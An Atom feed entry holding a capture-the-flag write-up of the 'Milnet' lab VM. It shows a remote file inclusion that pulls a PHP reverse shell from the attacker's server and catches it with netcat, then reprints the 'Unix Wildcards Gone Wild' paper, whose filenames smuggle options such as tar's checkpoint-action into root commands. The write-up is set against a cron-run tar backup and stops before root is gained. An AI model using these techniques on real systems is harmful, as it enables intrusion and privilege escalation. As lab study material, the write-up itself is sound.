<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: writeups | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-05-13T12:12:42-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hacking the Milnet]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/"/>
    <updated>2018-05-13T06:55:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is a story-based VM inspired by a book! Let&rsquo;s jump straight in!</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:cd:36 (RSA)
|   256 93:30:be:c2:af:dd:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)
|_  256 37:40:2b:cc:27:ae:89:22:d0:d2:65:65:c4:9b:53:42 (EdDSA)
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</code></p>

<p><img class="center" src="/images/pentest/milnet/milnet.jpg" title="&lsquo;milnet&rsquo; &lsquo;milnet&rsquo;" ></p>

<p>Nothing much on this site, some German text and a credits page. I ran Nikto on it with no significant finds. The site is running lighttpd/1.4.35 and it has an info.php page displaying phpinfo() output. There is also a line mentioning a RFI vulnerability for the info.php page, but I wasn&rsquo;t able to exploit that.</p>

<p>I ran dirb next, with no further luck. So I looked more closely at the phpinfo page. The allow_url_include directive is on, so RFI should definitely be possible somewhere, but I couldn&rsquo;t find extra pages. I tried OWASP ZAP next, and it helped with finding the vulnerable entry point:</p>

<p><img class="center" src="/images/pentest/milnet/zap.jpg" title="&lsquo;owasp zap rfi&rsquo; &lsquo;owasp zap rfi&rsquo;" ></p>

<p>I used Burp to craft a request directly to the content.php page, by trying to direct the route parameter to a page on my machine where the Python web server would serve a reverse shell, but it didn&rsquo;t work, so I took a step back to see how the website is using the route parameter. I just navigated on it with Burp on and observed the request:</p>

<p>```
POST /content.php HTTP/1.1
Host: 192.168.217.140
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: <a href="http://192.168.217.140/nav.php">http://192.168.217.140/nav.php</a>
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10</p>

<p>route=bomb
```</p>

<p>So I intercepted this and changed route to point to <a href="http://192.168.217.132:8000/shell.php.">http://192.168.217.132:8000/shell.php.</a> This is my attacking machine where I was serving the shell on port 8000 and waiting for it on port 8888. This time I did get an incoming request:</p>

<p><code>
python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.217.140 - - [13/May/2018 08:16:54] code 404, message File not found
192.168.217.140 - - [13/May/2018 08:16:54] "GET /shell.php.php HTTP/1.0" 404 -
</code></p>

<p>An extra .php extension is appended to the request. So I changed the RFI to:</p>

<p><code>
route=http://192.168.217.132:8000/shell
</code></p>

<p>And this time things went smoothly:</p>

<p><code>
192.168.217.140 - - [13/May/2018 08:29:41] "GET /shell.php HTTP/1.0" 200 -
</code></p>

<p>I have a shell:</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.140] 57412
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 14:29:41 up  1:38,  0 users,  load average: 0.13, 0.07, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
</code></p>

<p>I proceeded with some enumeration:</p>

<p><code>
$ ls /home
langman
$ ls /home/langman
SDINET
</code></p>

<p>There are lots of text files in here:</p>

<p><code>
$ ls
DCA_Circular.310-P115-1
DefenseCode_Unix_WildCards_Gone_Wild.txt
FUN18.TXT
compserv.txt
fips-index.
fips_500_166.txt
fips_500_169.txt
fips_500_170.txt
fips_500_171.txt
pentagon.txt
sec-8901.txt
sec-8902.txt
sec-9540.txt
sec-9720.txt
</code></p>

<p>These are various army-related documents which you can read at your own leisure. More interesting is the DefenseCode_Unix_WildCards_Gone_Wild.txt document, which lists different code execution techniques by exploiting Unix wildcards. Because this was such an interesting read, I&rsquo;ve included it here:</p>

<p>```</p>

<h1>Back To The Future: Unix Wildcards Gone Wild</h1>

<ul>
<li>Leon Juranic <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x6c;&#x65;&#111;&#x6e;&#64;&#x64;&#x65;&#102;&#x65;&#110;&#115;&#101;&#99;&#111;&#100;&#x65;&#x2e;&#99;&#x6f;&#x6d;">&#108;&#101;&#111;&#x6e;&#64;&#x64;&#x65;&#x66;&#x65;&#110;&#x73;&#101;&#x63;&#x6f;&#x64;&#101;&#46;&#99;&#111;&#x6d;</a></li>
<li>Creation Date: 04/20/2013</li>
<li>Release Date: 06/25/2014</li>
</ul>


<p>Table Of Content:</p>

<p>===[ 1. Introduction
===[ 2. Unix Wildcards For Dummies
===[ 3. Wildcard Wilderness
===[ 4. Something more useful&hellip;</p>

<pre><code>  4.1 Chown file reference trick (file owner hijacking)
  4.2 Chmod file reference trick
  4.3 Tar arbitrary command execution 
  4.4 Rsync arbitrary command execution
</code></pre>

<p>===[ 5. Conclusion</p>

<p>===[ 1. Introduction</p>

<p>First of all, this article has nothing to do with modern hacking
techniques like ASLR bypass, ROP exploits, 0day remote kernel exploits or Chrome&rsquo;s
Chain-14-Different-Bugs-To-Get-There&hellip;
Nope, nothing of the above. This article will cover one interesting
old-school Unix hacking technique, that will still work nowadays in 2013.
Hacking technique of which (to my suprise) even many security-related people haven&rsquo;t heard of.
That is probably because nobody ever really talked about it before.
Why I decided to write on this subject is because, to me personally, it&rsquo;s pretty funny
to see what can be done with simple Unix wildcard poisoning tricks.
So, from this article, what you can expect is collection of neat *nix hacking
tricks that as far as I know somehow didn&rsquo;t emerge earlier.
If you wonder how basic Unix tools like &lsquo;tar&rsquo; or &lsquo;chown&rsquo; can lead to
full system compromise, keep on reading.
Ladies and gentleman; take your seats, fasten your belts and hold on tight
&ndash; cause we&rsquo;re going straight back to the 80&rsquo;s, right to the Unix shell hacking&hellip;
(Is this bad-hair-rock/groovy disco music playing in the background? I think sooo&hellip;)</p>

<p>===[ 2. Unix Wildcards For Dummies</p>

<p>If you already know what Unix wildcards are, and how (and why) are they
used in shell scripting, you should skip this part.
However, we will include Wildcard definition here just for the sake of
consistency and for potential newcomers.
Wildcard is a character, or set of characters that can be used as a
replacement for some range/class of characters. Wildcards are interpreted
by shell before any other action is taken.</p>

<p>Some Shell Wildcards:</p>

<pre><code>*     An asterisk matches any number of characters
      in a filename, including none.
?     The question mark matches any single
      character.
[ ]   Brackets enclose a set of characters, any
      one of which may match a single character
      at that position.
-     A hyphen used within [ ] denotes a range of
      characters.
~     A tilde at the beginning of a word expands
      to the name of your home directory.  If you
      append another user's login name to the
      character, it refers to that user's home
      directory.
</code></pre>

<p>Basic example of wildcards usage:</p>

<h1>ls *.php</h1>

<ul>
<li>List all files with PHP extension</li>
</ul>


<h1>rm *.gz</h1>

<ul>
<li>Delete all GZIP files</li>
</ul>


<h1>cat backup*</h1>

<ul>
<li>Show content of all files which name is beginning with &lsquo;backup&rsquo; string</li>
</ul>


<h1>ls test?</h1>

<ul>
<li>List all files whose name is beginning with string &lsquo;test&rsquo; and has exactly
one additional character</li>
</ul>


<p>===[ 3. Wildcard Wilderness</p>

<p>Wildcards as their name states, are &ldquo;wild&rdquo; by their nature, but moreover,
in some cases, wildcards can go berserk.
During the initial phase of playing with this interesting wildcard tricks,
I&rsquo;ve talked with dozen old-school Unix admins and security people,
just to find out how many of them knows about wildcard tricks, and
potential danger that they pose.
To my suprise, only two of 20 people stated that they know it&rsquo;s not
wise to use wildcard, particulary in &lsquo;rm&rsquo; command, because someone
could abuse it with &ldquo;argument-like-filename&rdquo;. One of them said that he
heard of that years ago on some basic Linux admin course. Funny.</p>

<p>Simple trick behind this technique is that when using shell wildcards,
especially asterisk (*), Unix shell will interpret files beginning with hyphen
(&ndash;) character as command line arguments to executed command/program.
That leaves space for variation of classic channeling attack.
Channeling problem will arise when different kind of information channels
are combined into single channel. Practical case in form of particulary this technique
is combining arguments and filenames, as different &ldquo;channels&rdquo; into single,
because of using shell wildcards.</p>

<p>Let&rsquo;s check one very basic wildcard argument injection example.</p>

<p>[root@defensecode public]# ls -al
total 20
drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .
drwx&mdash;&mdash;&mdash;. 22 leon   leon   4096 Oct 28 16:15 ..
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3
-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file1.txt
-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file2.txt
-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file3.txt
-rw-rw-r&mdash;.  1 nobody nobody    0 Oct 28 16:38 -rf</p>

<p>We have directory with few subdirectories and few files in it.
There is also file with &lsquo;-rf&rsquo; filename ther owned by the user &lsquo;nobody&rsquo;.
Now, let&rsquo;s run &lsquo;rm *&rsquo; command, and check directory content again.</p>

<p>[root@defensecode public]# rm *
[root@defensecode public]# ls -al
total 8
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
drwx&mdash;&mdash;&mdash;. 22 leon   leon   4096 Oct 28 16:15 ..
-rw-rw-r&mdash;.  1 nobody nobody    0 Oct 28 16:38 -rf</p>

<p>Directory is totally empty, except for &lsquo;-rf&rsquo; file in it.
All files and directories were recursively deleted, and it&rsquo;s pretty obvious what happened&hellip;
When we started &lsquo;rm&rsquo; command with asterisk argument, all filenames in current
directory were passed as arguments to &lsquo;rm&rsquo; on command line, exactly same as
following line:</p>

<p>[user@defensecode WILD]$ rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf</p>

<p>Since there is &lsquo;-rf&rsquo; filename in current directory, &lsquo;rm&rsquo; got -rf option as the
last argument, and all files in current directory were recursively deleted.
We can also check that with strace:</p>

<p>[leon@defensecode WILD]$ strace rm *
execve(&ldquo;/bin/rm&rdquo;, [&ldquo;rm&rdquo;, &ldquo;DIR1&rdquo;, &ldquo;DIR2&rdquo;, &ldquo;DIR3&rdquo;, &ldquo;file1.txt&rdquo;, &ldquo;file2.txt&rdquo;,
&ldquo;file3.txt&rdquo;, &ldquo;-rf&rdquo;], [/<em> 25 vars </em>/]) = 0</p>

<pre><code>          ^- HERE
</code></pre>

<p>Now we know how it&rsquo;s possible to inject arbitrary arguments to the unix
shell programs. In the following chapter we will discuss how we can abuse that
feature to do much more than just recursively delete files.</p>

<p>===[ 4. Something more useful&hellip;</p>

<p>Since now we know how it&rsquo;s possible to inject arbitrary arguments to
shell commands, let&rsquo;s demonstrate few examples that are more useful,
than just recursive file unlinking.
First, when I stumbled across this wildcard tricks, I was starting to look
for basic and common Unix programs that could be seriously affected
with arbitrary and unexpected arguments.
In real-world cases, following examples could be abused in form of direct
interactive shell poisoning, or through some commands started from cron job,
shell scripts, through some web application, and so on.
In all examples below, attacker is hidden behind &lsquo;leon&rsquo; account, and victim
is of course &ndash; root account.</p>

<p>==[ 4.1 Chown file reference trick (file owner hijacking)</p>

<p>First really interesting target I&rsquo;ve stumbled across is &lsquo;chown&rsquo;.
Let&rsquo;s say that we have some publicly writeable directory with bunch of
PHP files in there, and root user wants to change owner of all PHP files to &lsquo;nobody&rsquo;.
Pay attention to the file owners in the following files list.</p>

<p>[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx&mdash;&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r&mdash;.  1 user user   66 Oct 28 17:36 admin.php
-rw-rw-r&mdash;.  1 user user   34 Oct 28 17:35 ado.php
-rw-rw-r&mdash;.  1 user user   80 Oct 28 17:44 config.php
-rw-rw-r&mdash;.  1 user user  187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 user user  201 Oct 28 17:35 download.php
-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r&mdash;.  1 user user   43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 user user   56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 user user  357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 user user  225 Oct 28 17:35 header.php
-rw-rw-r&mdash;.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r&mdash;.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php
-rw-rw&mdash;&mdash;.  1 user user   66 Oct 28 17:35 password.inc.php
-rw-rw-r&mdash;.  1 user user   94 Oct 28 17:35 script.php</p>

<p>Files in this public directory are mostly owned by the user named &lsquo;user&rsquo;,
and root user will now change that to &lsquo;nobody&rsquo;.</p>

<p>[root@defensecode public]# chown -R nobody:nobody *.php</p>

<p>Let&rsquo;s see who owns files now&hellip;</p>

<p>[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx&mdash;&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r&mdash;.  1 leon leon   66 Oct 28 17:36 admin.php
-rw-rw-r&mdash;.  1 leon leon   34 Oct 28 17:35 ado.php
-rw-rw-r&mdash;.  1 leon leon   80 Oct 28 17:44 config.php
-rw-rw-r&mdash;.  1 leon leon  187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 leon leon  201 Oct 28 17:35 download.php
-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r&mdash;.  1 leon leon   43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 leon leon   56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 leon leon  357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 leon leon  225 Oct 28 17:35 header.php
-rw-rw-r&mdash;.  1 leon leon  117 Oct 28 17:35 inc.php
-rw-rw-r&mdash;.  1 leon leon  111 Oct 28 17:38 index.php
-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php
-rw-rw&mdash;&mdash;.  1 leon leon   66 Oct 28 17:35 password.inc.php
-rw-rw-r&mdash;.  1 leon leon   94 Oct 28 17:35 script.php</p>

<p>Something is not right&hellip; What happened? Somebody got drunk here.
Superuser tried to change files owner to the user:group &lsquo;nobody&rsquo;, but somehow,
all files are owned by the user &lsquo;leon&rsquo; now.</p>

<p>If we take closer look, this directory previously contained just the
following two files created and owned by the user &lsquo;leon&rsquo;.</p>

<p>-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php</p>

<p>Thing is that wildcard character used in &lsquo;chown&rsquo; command line took arbitrary
&lsquo;&mdash;reference=.drf.php&rsquo; file and passed it to the chown command at
the command line as an option.</p>

<p>Let&rsquo;s check chown manual page (man chown):
   &mdash;reference=RFILE</p>

<pre><code>      use RFILE's owner and group rather than specifying OWNER:GROUP values
</code></pre>

<p>So in this case, &lsquo;&mdash;reference&rsquo; option to &lsquo;chown&rsquo; will override &lsquo;nobody:nobody&rsquo;
specified as the root, and new owner of files in this directory will be exactly
same as the owner of &lsquo;.drf.php&rsquo;, which is in this case user &lsquo;leon&rsquo;.
Just for the record, &lsquo;.drf&rsquo; is short for Dummy Reference File. :)</p>

<p>To conclude, reference option can be abused to change ownership of files to some
arbitrary user. If we set some other file as argument to the &mdash;reference option,
file that&rsquo;s owned by some other user, not &lsquo;leon&rsquo;, in that case he would become owner
of all files in this directory.</p>

<p>With this simple chown parameter pollution, we can trick root into changing ownership
of files to arbitrary users, and practically &ldquo;hijack&rdquo; files that are of interest to us.</p>

<p>Even more, if user &lsquo;leon&rsquo; previously created a symbolic link in that directory
that points to let&rsquo;s say /etc/shadow, ownership of /etc/shadow would also be changed
to the user &lsquo;leon&rsquo;.</p>

<p>===[ 4.2 Chmod file reference trick</p>

<p>Another interesting attack vector similar to previously described &lsquo;chown&rsquo;
attack is &lsquo;chmod&rsquo;.
Chmod also has &mdash;reference option that can be abused to specify arbitrary
permissions on files selected with asterisk wildcard.</p>

<p>Chmod manual page (man chmod):</p>

<pre><code>   --reference=RFILE
          use RFILE's mode instead of MODE values
</code></pre>

<p>Example is presented below.</p>

<p>[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r&mdash;.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r&mdash;.  1 user user    34 Oct 28 17:47 ado.php
-rw-rw-r&mdash;.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rw-rw-r&mdash;.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r&mdash;.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r&mdash;.  1 user user   111 Oct 28 17:38 index.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 29 00:41 &mdash;reference=.drf.php
-rw-rw-r&mdash;.  1 user user    94 Oct 28 17:38 script.php</p>

<p>Superuser will now try to set mode 000 on all files.</p>

<p>[root@defensecode public]# chmod 000 *</p>

<p>Let&rsquo;s check permissions on files&hellip;</p>

<p>[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 29 00:41 &mdash;reference=.drf.php
-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php</p>

<p>What happened? Instead of 000, all files are now set to mode 777 because
of the &lsquo;&mdash;reference&rsquo; option supplied through file name..
Once again, file .drf.php owned by user &lsquo;leon&rsquo; with mode 777 was
used as reference file and since &mdash;reference option is supplied, all files
will be set to mode 777.
Beside just &mdash;reference option, attacker can also create another file with
&lsquo;-R&rsquo; filename, to change file permissions on files in all subdirectories recursively.</p>

<p>===[ 4.3 Tar arbitrary command execution</p>

<p>Previous example is nice example of file ownership hijacking. Now, let&rsquo;s go to even
more interesting stuff like arbitrary command execution. Tar is very common unix program
for creating and extracting archives.
Common usage for lets say creating archives is:</p>

<p>[root@defensecode public]# tar cvvf archive.tar *</p>

<p>So, what&rsquo;s the problem with &lsquo;tar&rsquo;?
Thing is that tar has many options, and among them, there some pretty interesting
options from arbitrary parameter injection point of view.</p>

<p>Let&rsquo;s check tar manual page (man tar):</p>

<pre><code>  --checkpoint[=NUMBER]
          display progress messages every NUMBERth record (default 10)

   --checkpoint-action=ACTION
          execute ACTION on each checkpoint
</code></pre>

<p>There is &lsquo;&mdash;checkpoint-action&rsquo; option, that will specify program which will
be executed when checkpoint is reached. Basically, that allows us arbitrary
command execution.</p>

<p>Check the following directory:</p>

<p>[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r&mdash;.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r&mdash;.  1 user user    34 Oct 28 17:47 ado.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:19 &mdash;checkpoint=1
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:17 &mdash;checkpoint-action=exec=sh shell.sh
-rw-rw-r&mdash;.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 user user   201 Oct 28 17:43 download.php
-rw-rw-r&mdash;.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r&mdash;.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r&mdash;.  1 user user   111 Oct 28 17:38 index.php
-rw-rw-r&mdash;.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</p>

<p>Now, for example, root user wants to create archive of all files in current
directory.</p>

<p>[root@defensecode public]# tar cf archive.tar *</p>

<p>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</p>

<p>Boom! What happened? /usr/bin/id command gets executed! We&rsquo;ve just achieved arbitrary command
execution under root privileges.
Once again, there are few files created by user &lsquo;leon&rsquo;.</p>

<p>-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:19 &mdash;checkpoint=1
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:17 &mdash;checkpoint-action=exec=sh shell.sh
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</p>

<p>Options &lsquo;&mdash;checkpoint=1&rsquo; and &lsquo;&mdash;checkpoint-action=exec=sh shell.sh&rsquo; are passed to the
&lsquo;tar&rsquo; program as command line options. Basically, they command tar to execute shell.sh
shell script upon the execution.</p>

<p>[root@defensecode public]# cat shell.sh
/usr/bin/id</p>

<p>So, with this tar argument pollution, we can basically execute arbitrary commands
with privileges of the user that runs tar. As demonstrated on the &lsquo;root&rsquo; account above.</p>

<p>===[ 4.4 Rsync arbitrary command execution</p>

<p>Rsync is &ldquo;a fast, versatile, remote (and local) file-copying tool&rdquo;, that is very
common on Unix systems.
If we check &lsquo;rsync&rsquo; manual page, we can again find options that can be abused for arbitrary
command execution.</p>

<p>Rsync manual:
&ldquo;You use rsync in the same way you use rcp. You must specify a source and a destination,
one of which may be remote.&rdquo;</p>

<p>Interesting rsync option from manual:</p>

<p> -e, &mdash;rsh=COMMAND           specify the remote shell to use</p>

<pre><code> --rsync-path=PROGRAM    specify the rsync to run on remote machine
</code></pre>

<p>Let&rsquo;s abuse one example directly from the &lsquo;rsync&rsquo; manual page.
Following example will copy all C files in local directory to a remote host &lsquo;foo&rsquo;
in &lsquo;/src&rsquo; directory.</p>

<h1>rsync -t *.c foo:src/</h1>

<p>Directory content:</p>

<p>[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</p>

<p>Now root will try to copy all C files to the remote server.</p>

<p>[root@defensecode public]# rsync -t *.c foo:src/</p>

<p>rsync: connection unexpectedly closed (0 bytes received so far) [sender]
rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]</p>

<p>Let&rsquo;s see what happened&hellip;</p>

<p>[root@defensecode public]# ls -al
total 76
drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
-rw-r&mdash;r&mdash;.  1 root root   101 Mar 28 04:49 shell_output.txt</p>

<p>There were two files owned by user &lsquo;leon&rsquo;, as listed below.</p>

<p>-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</p>

<p>After &lsquo;rsync&rsquo; execution, new file shell_output.txt whose owner is root
is created in same directory.</p>

<p>-rw-r&mdash;r&mdash;.  1 root root   101 Mar 28 04:49 shell_output.txt</p>

<p>If we check its content, following data is found.</p>

<p>[root@defensecode public]# cat shell_output.txt
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</p>

<p>Trick is that because of the &lsquo;*.c&rsquo; wildcard, &lsquo;rsync&rsquo; got &lsquo;-e sh shell.c&rsquo; option
on command line, and shell.c will be executed upon &lsquo;rsync&rsquo; start.
Content of shell.c is presented below.</p>

<p>[root@defensecode public]# cat shell.c
/usr/bin/id > shell_output.txt</p>

<p>===[ 5. Conclusion</p>

<p>Techniques discussed in article can be applied in different forms on various popular
Unix tools. In real-world attacks, arbitrary shell options/arguments could be hidden
among regular files, and not so easily spotted by administrator. Moreover, in case of
cron jobs, shell scripts or web applications that calls shell commands, that&rsquo;s not
even important. Moreover, there are probably much more popular Unix tools susceptible
to previously described wildcard attacks.
Thanks to Hrvoje Spoljar and Sec-Consult for a few ideas regarding this document.
```</p>

<p>This entertaining and useful read will probably come in handy next! I looked around some more, and saw a backup folder inside the / directory:</p>

<p>```
$ ls
backup.sh
backup.tgz
$ cat backup.sh</p>

<h1>!/bin/bash</h1>

<p>cd /var/www/html
tar cf /backup/backup.tgz *
```</p>

<p>This backup script creates an archive of all files inside /var/www/html. And it&rsquo;s owned by root. After reading that section about tar command execution, this is a big sign of the next steps to take in achieving root. So I needed to find out if this backup shell script is being used by anything. I grepped for a mention of the script in the files present on the filesystem:</p>

<p><code>
grep -r "backup.sh" 2&gt;/dev/null
</code></p>

<p>And an interesting entry popped up:</p>

<p><code>
etc/crontab:*/1 *   * * *   root    /backup/backup.sh
</code></p>

<p>The backup script is run every minute by cron. Now review the tar command execution section before proceeding. To run arbitrary code, we have to create 3 files inside the directory where tar is run, which in this case is /var/www/html.</p>

<p>Now, remember the checkpoint parameters:</p>

<p>```
&mdash;checkpoint[=NUMBER]</p>

<pre><code>display progress messages every NUMBERth record (default 10)
</code></pre>

<p>&mdash;checkpoint-action=ACTION</p>

<pre><code>execute ACTION on each checkpoint
</code></pre>

<p>```</p>

